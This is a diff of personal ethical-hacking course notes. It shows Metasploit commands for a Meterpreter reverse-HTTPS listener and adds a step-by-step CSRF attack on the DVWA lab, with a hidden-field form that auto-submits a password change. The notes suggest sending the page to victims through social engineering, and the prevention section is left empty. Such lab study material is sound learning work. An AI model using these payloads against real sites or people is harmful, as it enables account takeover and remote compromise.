@@ -921,7 +921,7 @@ Note -> do not use virus total bcz it share the results with anti virus programs
 	> use exploit/multi/handler
 	> set PAYLOAD windows/meterpreter/reverse_https
 	> set LHOST ip
-	> set LPORT 8180
+	> set LPORT 8080
 	> exploit // and the listening will start
 	
 - cmd -> cd /var/www/html 
@@ -967,7 +967,36 @@ CSRF Vulnerabilities Discovery -> Screenshot(503)
 - It basically happens when the website doesn't validate if the user wants to do certain tasks such as changing Profile Pic etc and
 in such a case we will be able to program a HTML page and when user runs it they will be forced to carry out certain tasks that we
 program to do such as changing the user passwords without the knowledge of user
-- 
+Step 1 - Go to DVWA -> CSRF and then change the password // In low security the current password won't be asked
+Step 2 -> Do Inspect element on the page, search for the start and the end of the 'form' tag of the page, right click on the form
+	tag in the Web Debugger and select 'Edit as HTML' , copy the whole HTML and paste in leafpad and save the file as HTML page
+Step 3 -> Execute the page which is now a simple html file now lets change the HTML code as following ->
+
+	<form action="http://target_ip/page_url_which_we_edited" method="GET">  // and save the file and now enter the credentials
+	and now u will see that the password is changed and it got redirected to that web page with who's html we had edited
+	
+Step 4 -> change the html code for the page like above again as ->
+	<input type="hidden" .... > // do this for all the input tags in the web page and remove other type tags
+	
+	also remove the text 'New password' and 'Confirm new password' from the web page
+	
+	replace other type tags such as type="password" to value="changed_password" also remove type="submit"
+	
+	<form id="form1" ....> // to give id to the form
+	
+	<script>document.getElementById('form1').submit();</script> // this is to execute the form
+	
+Step 5 -> Execute the file and the CSRF password change will be done // now u can use this file to trick the target to click on the
+	web page using social engineering or u can host the page and send the URL to victim to execute the page which is the most
+	recommended way to attack
+	
+Step 6 -> On the Windows -> open DVWA website and login -> access the webpage for CSRF to attacker machine which is hosted from
+	/var/www/html and once the page is executed the password would got change, this trick will work with every website with
+	the CSRF vulnerability
+	
+To Prevent CSRF vulnerabilities -> 
+	
+
 
 
 --------------------------------------------------------------------------------------------------------------------------------
